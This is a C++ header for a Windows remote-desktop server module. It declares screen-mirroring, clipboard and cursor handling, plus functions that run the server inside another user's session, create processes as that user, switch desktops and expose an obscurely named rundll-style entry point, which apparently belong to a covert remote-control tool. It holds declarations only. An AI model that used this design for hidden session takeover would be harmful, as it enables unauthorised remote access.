#ifndef _WIN32_WINNT
#define _WIN32_WINNT 0x500
#endif

#include "sock.h"
#include <windows.h>
#include <stdio.h>
#include "CWinMirro.h"
#include "CCursor.h"
#include "..\..\zxsCommon\CSpeedTest.h"
#include "..\..\zxsCommon\CSocketData.h"

#include "..\..\zxsCommon\rdpBufferEncodeZlib.h"
#include "..\..\zxsCommon\debugoutput.h"
#include "../switchdesktop.h"

// 
// #if defined _DEBUG
// 	#pragma comment(lib, "RD_libD.lib")
// #else
// 	#pragma comment(lib, "RD_lib.lib")
// #endif


#define RDSRV_VERSION (float)1.2

DWORD WINAPI RDServer(LPVOID lParam);

BOOL RunRDServerWithDupSocket(char *lpszPipeName);
BOOL RDServerGetDupSocket(char *lpszPipeName, SOCKET *pSocket);
BOOL run_RDS_in_session(DWORD sessionid);
BOOL CreateProcessAsSessionUser(ULONG sessionid, LPTSTR commandLine);
void CALLBACK zxFunction001(
				HWND hWnd, // handle to owner window
				HINSTANCE hInst, // instance handle for the DLL
				char *Param, // string the DLL will parse
				int nCmdShow // show state
);
BOOL SetupExplorerInActSession(LPPROCESS_INFORMATION lppi);
BOOL ChangeDesktop(char *deskname);


class rd_Client
{
protected:
	SOCKET m_socket;

	_tagRDPHEAD rdph;

	int comprAutoSel;
	int m_comprLevel;
	_rdpBuffer zbmpbuf;

	CSocketData sockdata;
	CSpeedTest speedtest;
	rd_Cursor m_cursor;
	CWinMirror wmirror;
	bool runFlag;

	bool m_bUseJpegEncode;
	_rdpBuffer jpegBuf;

	PROCESS_INFORMATION explorerPI;

public:
	rd_Client(SOCKET s);
	~rd_Client();

	static BOOL TestSocketStatus(SOCKET s);

	int SetComprLevel(int level){ return m_comprLevel = level;}
	int ProcessClient();
	BOOL ReadAction();
	BOOL SendAction(BYTE action, BYTE flag, DWORD dataSize);
	BOOL SendRDPVersion();
	int GetMessage();

	static int WINAPI UpdateRect(int DataType, BYTE *buffer, int datalen, void *lParam);
	int WINAPI UpdateRect(int DataType, BYTE *buffer, int datalen);
	int UpdateCursorPos();
	
	int UpdateLocalClipboard(_tagRDPHEAD &rdph);
	int SendLocalCutText();
};



